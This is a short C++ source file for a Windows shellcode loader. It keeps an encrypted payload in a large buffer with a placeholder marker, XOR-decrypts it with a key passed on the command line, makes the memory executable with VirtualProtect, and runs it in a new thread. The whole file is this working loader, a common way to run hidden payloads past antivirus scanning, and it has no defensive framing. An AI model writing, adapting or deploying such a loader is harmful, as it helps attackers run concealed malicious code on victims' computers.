#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>

using namespace std;

char* key;
char buf[1024 * 1024] = "LODRRDOL";
size_t buf_len = 1024 * 1024;

void decrypt(char* dst) {
	for (u_int i = 0; i < buf_len; i ++) {
		dst[i] = (char)(buf[i] ^ key[i % strlen(key)]);
	}
}

int main(int argc, char** argv)
{
	if (argc != 2) {
		return 1;
	}

	key = argv[1];

	// create page
	char* addr = (char *)VirtualAlloc(NULL, buf_len, MEM_COMMIT, PAGE_READWRITE);
	if (!addr)
		return 0;

	// copy data
	decrypt(addr);

	// change perms
	DWORD old;
	if (!VirtualProtect(addr, buf_len, PAGE_EXECUTE_READ, &old))
		return 0;

	// create thread
	DWORD tid;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &tid);
	if (!t)
		return 0;

	// wait
	WaitForSingleObject(t, INFINITE);

	return 0;
}

